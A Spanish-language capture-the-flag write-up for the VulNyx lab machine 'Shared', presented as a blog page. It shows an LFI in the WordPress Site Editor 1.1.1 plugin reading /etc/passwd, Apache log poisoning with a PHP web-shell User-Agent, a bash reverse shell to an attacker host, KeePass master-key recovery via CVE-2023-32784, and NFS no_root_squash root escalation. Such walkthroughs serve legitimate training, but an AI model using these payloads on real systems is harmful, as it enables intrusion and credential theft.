@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="es"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">VulNyx - Shared | noname</title>
+<meta property="og:title" content="VulNyx - Shared | noname" />
+<meta name="twitter:title" content="VulNyx - Shared | noname" />
+<meta itemprop="name" content="VulNyx - Shared | noname" />
+<meta name="application-name" content="VulNyx - Shared | noname" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="Writeup Shared 🟡">
+<meta itemprop="description" content="Writeup Shared 🟡" />
+<meta property="og:description" content="Writeup Shared 🟡" />
+<meta name="twitter:description" content="Writeup Shared 🟡" />
+
+<meta property="og:locale" content="es" />
+<meta name="language" content="es" />
+
+  <link rel="alternate" hreflang="en" href="https://0x-noname.github.io/writeups/nyx/shared/" title="" />
+
+
+
+  <meta itemprop="image" content="https://0x-noname.github.io/images/logo.png" />
+  <meta property="og:image" content="https://0x-noname.github.io/images/logo.png" />
+  <meta name="twitter:image" content="https://0x-noname.github.io/images/logo.png" />
+  <meta name="twitter:image:src" content="https://0x-noname.github.io/images/logo.png" />
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2024-01-31T10:02:22&#43;0200 />
+    <meta property="article:published_time" content=2024-01-31T10:02:22&#43;0200 />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "VulNyx - Shared",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2024-01-31",
+        "description": "Writeup Shared 🟡",
+        "wordCount":  908 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2024-01-31",
+        "image": {
+        "@type": "imageObject",
+        "url": "\/images\/logo.png"
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "noname"
+        }
+    }
+    </script>
+
+
+
+<meta name="generator" content="Hugo 0.125.7">
+
+    
+
+    <link rel="canonical" href="https://0x-noname.github.io/writeups/nyx/shared/">
+    <link href="/style.min.d43bc6c79baa87f006efb2b92be952faeedeb1a3ab626c1d6abda52eae049355.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="https://0x-noname.github.io/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+  
+
+</head>
+<body data-theme = "" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="https://0x-noname.github.io/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title></title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        $ home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/hackmyvm/">
+                        $ hmv
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/hackthebox/">
+                        $ htb
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/vulnyx/">
+                        $ nyx
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/whoami/">
+                        $ whoami
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">VulNyx - Shared</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2024-01-31T10:02:22&#43;02:00" itemprop="datePublished"> Jan 31, 2024 </time>
+                </div>
+                
+            </header>
+            
+            <div class="page-content">
+                <p><img src="/../machines/nyx/shared/shared_logo.webp" alt="logo"></p>
+<ul>
+<li><em>WordPress Plugin Site Editor 1.1.1 - LFI</em></li>
+<li><em>Log Poisoning access.log - RCE</em></li>
+<li><em>Brute Force KeePass - CVE-2023-32784 - KeePwn</em></li>
+<li><em>NFS no_root_squash - Privesc</em></li>
+</ul>
+<h3 id="escaneo-de-puertos">Escaneo de puertos</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nmap -p- -T5 -n -v 192.168.1.145
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE
+</span></span><span class="line"><span class="cl">22/tcp    open  ssh
+</span></span><span class="line"><span class="cl">80/tcp    open  http
+</span></span><span class="line"><span class="cl">111/tcp   open  rpcbind
+</span></span><span class="line"><span class="cl">2049/tcp  open  nfs
+</span></span><span class="line"><span class="cl">34019/tcp open  unknown
+</span></span><span class="line"><span class="cl">41479/tcp open  unknown
+</span></span><span class="line"><span class="cl">41865/tcp open  unknown
+</span></span><span class="line"><span class="cl">48099/tcp open  unknown
+</span></span><span class="line"><span class="cl">48919/tcp open  unknown
+</span></span></code></pre></div><h3 id="escaneo-de-servicios">Escaneo de servicios</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nmap -sVC -p 22,80,111,2049,34019,41479,41865,48099,48919 -v 192.168.1.145
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE  VERSION
+</span></span><span class="line"><span class="cl">22/tcp    open  ssh      OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">|   256 9d:c2:e5:b9:bc:86:d4:81:5e:ad:aa:8d:87:a8:ad:5b (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 6a:d1:8a:c1:4d:f9:0c:4f:c5:f6:21:bb:c9:a6:24:53 (ED25519)
+</span></span><span class="line"><span class="cl">80/tcp    open  http     Apache httpd 2.4.57 ((Debian))
+</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.57 (Debian)
+</span></span><span class="line"><span class="cl">| http-methods: 
+</span></span><span class="line"><span class="cl">|_  Supported Methods: HEAD GET POST OPTIONS
+</span></span><span class="line"><span class="cl">|_http-title: Apache2 Debian Default Page: It works
+</span></span><span class="line"><span class="cl">111/tcp   open  rpcbind  2-4 (RPC #100000)
+</span></span><span class="line"><span class="cl">| rpcinfo: 
+</span></span><span class="line"><span class="cl">|   program version    port/proto  service
+</span></span><span class="line"><span class="cl">|   100000  2,3,4        111/tcp   rpcbind
+</span></span><span class="line"><span class="cl">|   100000  2,3,4        111/udp   rpcbind
+</span></span><span class="line"><span class="cl">|   100000  3,4          111/tcp6  rpcbind
+</span></span><span class="line"><span class="cl">|   100000  3,4          111/udp6  rpcbind
+</span></span><span class="line"><span class="cl">|   100003  3,4         2049/tcp   nfs
+</span></span><span class="line"><span class="cl">|   100003  3,4         2049/tcp6  nfs
+</span></span><span class="line"><span class="cl">|   100005  1,2,3      41865/tcp   mountd
+</span></span><span class="line"><span class="cl">|   100005  1,2,3      42927/tcp6  mountd
+</span></span><span class="line"><span class="cl">|   100005  1,2,3      51255/udp   mountd
+</span></span><span class="line"><span class="cl">|   100005  1,2,3      58830/udp6  mountd
+</span></span><span class="line"><span class="cl">|   100021  1,3,4      41479/tcp   nlockmgr
+</span></span><span class="line"><span class="cl">|   100021  1,3,4      43521/tcp6  nlockmgr
+</span></span><span class="line"><span class="cl">|   100021  1,3,4      46560/udp6  nlockmgr
+</span></span><span class="line"><span class="cl">|   100021  1,3,4      49015/udp   nlockmgr
+</span></span><span class="line"><span class="cl">|   100024  1          39895/tcp6  status
+</span></span><span class="line"><span class="cl">|   100024  1          43989/udp6  status
+</span></span><span class="line"><span class="cl">|   100024  1          48919/tcp   status
+</span></span><span class="line"><span class="cl">|   100024  1          55694/udp   status
+</span></span><span class="line"><span class="cl">|   100227  3           2049/tcp   nfs_acl
+</span></span><span class="line"><span class="cl">|_  100227  3           2049/tcp6  nfs_acl
+</span></span><span class="line"><span class="cl">2049/tcp  open  nfs_acl  3 (RPC #100227)
+</span></span><span class="line"><span class="cl">34019/tcp open  mountd   1-3 (RPC #100005)
+</span></span><span class="line"><span class="cl">41479/tcp open  nlockmgr 1-4 (RPC #100021)
+</span></span><span class="line"><span class="cl">41865/tcp open  mountd   1-3 (RPC #100005)
+</span></span><span class="line"><span class="cl">48099/tcp open  mountd   1-3 (RPC #100005)
+</span></span><span class="line"><span class="cl">48919/tcp open  status   1 (RPC #100024)
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>Realizando fuerza bruta de directorios encuentro el directorio <code>/wordpress</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/big.txt  &#39;http://192.168.1.145/FUZZ&#39;
+</span></span><span class="line"><span class="cl">********************************************************
+</span></span><span class="line"><span class="cl">* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span class="line"><span class="cl">********************************************************
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Target: http://192.168.1.145/FUZZ
+</span></span><span class="line"><span class="cl">Total requests: 20476
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">=====================================================================
+</span></span><span class="line"><span class="cl">ID           Response   Lines    Word       Chars       Payload                                   
+</span></span><span class="line"><span class="cl">=====================================================================
+</span></span><span class="line"><span class="cl">000000017:   403        9 L      28 W       277 Ch      &#34;.htpasswd&#34;                               
+</span></span><span class="line"><span class="cl">000000016:   403        9 L      28 W       277 Ch      &#34;.htaccess&#34;                               
+</span></span><span class="line"><span class="cl">000016220:   403        9 L      28 W       277 Ch      &#34;server-status&#34;                           
+</span></span><span class="line"><span class="cl">000019915:   301        9 L      28 W       316 Ch      &#34;wordpress&#34;
+</span></span></code></pre></div><p>Si voy al directorio <code>/wordpress</code> me redirige al dominio <strong><a href="http://shared.nyx/wordpress">http://shared.nyx/wordpress</a></strong>.</p>
+<p><img src="/../machines/nyx/shared/dominio.webp" alt="dominio"></p>
+<p>Añado el dominio a mi archivo <strong>hosts</strong> para visualizar correctamente la web.</p>
+<p><img src="/../machines/nyx/shared/wordpress.webp" alt="wordpress"></p>
+<p>Al tratarse de una web creada con <strong>worpress</strong> lanzo <strong>wpscan</strong> para enumerar la web.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ wpscan --url http://shared.nyx/wordpress
+</span></span></code></pre></div><p>Al terminar el escaneo veo que ha encontrado el plugin <strong>site-editor</strong>.</p>
+<p><img src="/../machines/nyx/shared/site_editor.webp" alt="site_editor"></p>
+<p>Busco en internet <strong>site editor 1.1.1</strong> y encuentro este exploit.</p>
+<p><img src="/../machines/nyx/shared/exploit_site_editor.webp" alt="exploit_site_editor"></p>
+<p>En el poc del exploit muestra como obtener un <strong>LFI</strong> mediante una url.</p>
+<p><img src="/../machines/nyx/shared/poc.webp" alt="poc"></p>
+<p>Con <strong>curl</strong> obtengo el fichero <strong>passwd</strong> del sistema y enumero varios usuarios.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ curl &#34;http://shared.nyx/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd&#34;;echo
+</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span class="line"><span class="cl">games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">jackondor:x:1001:1001::/home/jackondor:/bin/bash
+</span></span><span class="line"><span class="cl">_rpc:x:102:65534::/run/rpcbind:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">statd:x:103:65534::/var/lib/nfs:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">mysql:x:104:110:MySQL Server,,,:/nonexistent:/bin/false
+</span></span><span class="line"><span class="cl">j4ckie:x:1002:1002::/home/j4ckie:/bin/sh
+</span></span><span class="line"><span class="cl">condor:x:1003:1003::/home/condor:/bin/sh
+</span></span><span class="line"><span class="cl">{&#34;success&#34;:true,&#34;data&#34;:{&#34;output&#34;:[]}}
+</span></span></code></pre></div><p>Al tratarse de un servidor <strong>apache</strong> me voy a <code>/var/log/apache2/access.log</code> y consigo ver el contenido.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ curl &#34;http://shared.nyx/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/log/apache2/access.log&#34;
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">192.168.1.15 - - [26/Jan/2024:16:45:05 +0100] &#34;GET /wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/log/apache2/access.log HTTP/1.1&#34; 200 187 &#34;-&#34; &#34;curl/8.3.0&#34;
+</span></span><span class="line"><span class="cl">{&#34;success&#34;:true,&#34;data&#34;:{&#34;output&#34;:[]}}
+</span></span></code></pre></div><p>Uso <strong>curl</strong> para incrustar código php en el <strong>User-Agent</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">curl &#34;http://shared.nyx/wordpress/&#34; -H &#34;User-Agent: &lt;?php system(&#39;id&#39;); ?&gt;&#34;
+</span></span></code></pre></div><p>Visualizo de nuevo el <code>access.log</code> y veo que se ha ejecutado el comando <strong>id</strong>.</p>
+<p><img src="/../machines/nyx/shared/id_comand.webp" alt="id_comand"></p>
+<p>Sabiendo esto incrusto este código <strong>php</strong> en el <strong>User-Agent</strong> para ejecutar comandos.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">curl &#34;http://shared.nyx/wordpress/&#34; -H &#34;User-Agent: &lt;?php system(\$_GET[&#39;shell&#39;]); ?&gt;&#34;
+</span></span></code></pre></div><p>Ahora si lanzo de nuevo <strong>curl</strong> para visualizar el <code>access.log</code> y le concateno la variable <strong>shell</strong> observo que puedo ejecutar comandos.</p>
+<p><img src="/../machines/nyx/shared/logpoisoningOK.webp" alt="logpoisoningOK"></p>
+<p>Me mando una shell urlencodeada.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ curl &#34;http://shared.nyx/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/log/apache2/access.log&amp;shell=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.15%2F4444%200%3E%261%27&#34;
+</span></span></code></pre></div><p>Dejo un <strong>netcat</strong> a la escucha y recibo la shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nc -lvp 4444
+</span></span><span class="line"><span class="cl">listening on [any] 4444 ...
+</span></span><span class="line"><span class="cl">connect to [192.168.1.15] from shared.nyx [192.168.1.145] 57126
+</span></span><span class="line"><span class="cl">bash: cannot set terminal process group (608): Inappropriate ioctl for device
+</span></span><span class="line"><span class="cl">bash: no job control in this shell
+</span></span><span class="line"><span class="cl">&lt;ite-editor/editor/extensions/pagebuilder/includes$ id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl">uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></span></code></pre></div><p>Después de realizar el tratamiento para la tty encuentro <code>cp-sharedbbdd.zip</code> en el directorio <code>/backups</code>.</p>
+<p><img src="/../machines/nyx/shared/lsla.webp" alt="lsla"></p>
+<p>Con python creo un servidor <strong>HTTP</strong> para compartir el archivo <code>cp-sharedbbdd.zip</code>.</p>
+<p><img src="/../machines/nyx/shared/httppython.webp" alt="httppython"></p>
+<p>Descargo <code>cp-sharedbbdd.zip</code> y al descomprimirlo veo los siguientes archivos.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ unzip cp-sharedbbdd.zip
+</span></span><span class="line"><span class="cl">Archive:  cp-sharedbbdd.zip
+</span></span><span class="line"><span class="cl">   creating: EMP41111/
+</span></span><span class="line"><span class="cl">  inflating: EMP41111/KeePass.DMP    
+</span></span><span class="line"><span class="cl"> extracting: EMP41111/sharedbbdd.kdbx 
+</span></span></code></pre></div><h3 id="cve-2023-32784">CVE-2023-32784</h3>
+<p>Al tener un volcado de memoria <strong>KeePass.DMP</strong> puedo extraer la <strong>Master Key</strong> con <a href="https://github.com/Orange-Cyberdefense/KeePwn?tab=readme-ov-file#memory-dumps-parsing">KeePwn</a>, en esta parte del <a href="https://github.com/Orange-Cyberdefense/KeePwn?tab=readme-ov-file#memory-dumps-parsing">README</a> explica como usar la herramienta.</p>
+<p><img src="/../machines/nyx/shared/keepwn.webp" alt="keepwn"></p>
+<p>Abro <strong>KeePAssXC</strong> cargo el archivo <code>sharedbbdd.kdbx</code> e introduzco la <strong>Master Key</strong>.</p>
+<p><img src="/../machines/nyx/shared/keepassx.webp" alt="keepassx"></p>
+<p>La base de datos contiene 3 usuarios con sus credenciales.</p>
+<p><img src="/../machines/nyx/shared/usersKeepass.webp" alt="usersKeepass"></p>
+<p>Me conecto al sistema como usuario <strong>jackondor</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ ssh jackondor@192.168.1.145
+</span></span><span class="line"><span class="cl">(jackondor@192.168.1.145) Password: 
+</span></span><span class="line"><span class="cl">Linux shared 6.1.0-17-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.69-1 (2023-12-30) x86_64
+</span></span><span class="line"><span class="cl">jackondor@shared:~$ id
+</span></span><span class="line"><span class="cl">uid=1001(jackondor) gid=1001(jackondor) grupos=1001(jackondor)
+</span></span></code></pre></div><p>Enumerando el sistema con <code>linpeas.sh</code> encuentro un servidor <strong>NFS</strong> que tiene montadas 3 carpetas, estas carpetas las monté anteriormente pero no contienen nada de utilidad para la intrusión.</p>
+<p><img src="/../machines/nyx/shared/linpeas.webp" alt="linpeas"></p>
+<p>Usando el recurso de <a href="https://book.hacktricks.xyz/v/es/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe">hacktricks</a> me doy cuenta de que esas carpetas ahora me servirán para escalar privilegios. Siguiendo los pasos de <strong>hacktricks</strong> me voy a mi equipo y como <strong>root</strong> creo la carpeta <code>/privesc</code> en el directorio <code>/tmp</code>.</p>
+<pre tabindex="0"><code>❯ mkdir /tmp/privesc
+</code></pre><p>Monto un directorio remoto ubicado en el servidor <strong>NFS</strong> con la dirección IP <strong>192.168.1.145</strong> y la ruta <code>/shared/tmp</code> en mi directorio local <code>/tmp/privesc</code>.</p>
+<pre tabindex="0"><code>❯ mount -t nfs 192.168.1.145:/shared/tmp /tmp/privesc
+</code></pre><p>Entro en el directorio <code>/tmp/privesc</code>, copio el binario <code>/bin/bash</code> y le doy permisos <strong>SUID</strong>.</p>
+<pre tabindex="0"><code>❯ cd /tmp/privesc
+❯ cp /bin/bash .
+❯ chmod +s bash
+</code></pre><p>En la máquina objetivo entro en la carpeta <code>/shared/tmp</code> y veo el binaro <strong>bash</strong> con permisos <strong>SUID</strong>.</p>
+<p><img src="/../machines/nyx/shared/sharedTmp.webp" alt="sharedTmp"></p>
+<p>Obtengo el root de la siguiente forma.</p>
+<p><img src="/../machines/nyx/shared/root.webp" alt="root"></p>
+<p>Y aquí termina la máquina Shared.</p>
+<p>Saludos!</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/0x-noname" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2024 .
+        
+    </small>
+</footer><a href="#" title="" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+
+
+    
+    <script src="https://0x-noname.github.io/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
